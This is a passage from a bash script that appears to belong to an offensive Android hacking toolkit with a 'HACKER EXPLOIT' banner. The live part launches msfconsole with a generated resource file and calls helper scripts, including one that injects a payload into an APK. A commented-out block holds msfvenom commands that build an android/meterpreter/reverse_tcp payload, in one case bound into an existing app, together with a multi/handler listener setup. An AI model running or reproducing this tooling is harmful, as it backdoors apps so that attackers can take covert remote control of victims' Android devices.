			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${RESTORE}"
			echo "=============================================================================================================="
			echo "${RESTORE}"
			echo "your LHOST or local ip was set ${GREEN}'$IP' "
			echo "${RESTORE}"
			echo "your LPORT or local port was set ${GREEN}'$PORT' "
			echo "${RESTORE}"
			echo "your output app name was set ${GREEN}'$APPNAME' "
			echo "${RESTORE}"
			echo " opening msfconsole  "
			echo "=============================================================================================================="
			echo "${RESTORE}"
			rm -rf $LPARTH/$APPNAME.apk
			rm -rf $LPARTH/$APPNAME

			msfconsole -r $LPARTH/temp/$APPNAME.rc

			 bash $LPARTH/actions/android-AVB..sh


		###############44###################44#######################444444444##########################444#############################
		elif [ "$planet" == inject-payload-into-apk ]
			then
				 bash $LPARTH/actions/android-ipia.sh
				


		elif [ "$planet" == Back ]
		then
		   bash $LPARTH/netac.sh


		fi
	done





















: <<'END_COMMENT'
====================================================================================================================================================



	#OUTPUT 

	echo " ===============loading-100%================="

	echo "file creating while 3 of 2 min "

	#msfvenom -p android/meterpreter/reverse_tcp Lhost=$IP Lport=$PORT R > 
	#msfvenom -x $INAPP -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -o $LPARTH/$APPNAME.apk
	#temp  file creating or remove .

	echo "checking temp file and clear case data and temp dir for better perform "



	rm -rf $LPARTH/temp


	echo " ======================100%======================"

	echo " Creating a msf temp dir" 


	mkdir $LPARTH/temp

	touch $LPARTH/temp/$APPNAME.rc 

	#exquate ip & port & handeler & payload 

	echo " use multi/handler" >> $LPARTH/temp/$APPNAME.rc 
	echo " set PAYLOAD android/meterpreter/reverse_tcp " >> $LPARTH/temp/$APPNAME.rc
	echo " set LHOST $IP " >> $LPARTH/temp/$APPNAME.rc
	echo " set LPORT $PORT " >> $LPARTH/temp/$APPNAME.rc

	echo " opening msfconsole  "


	msfconsole -r $LPARTH/temp/$APPNAME.rc


END_COMMENT
	done 
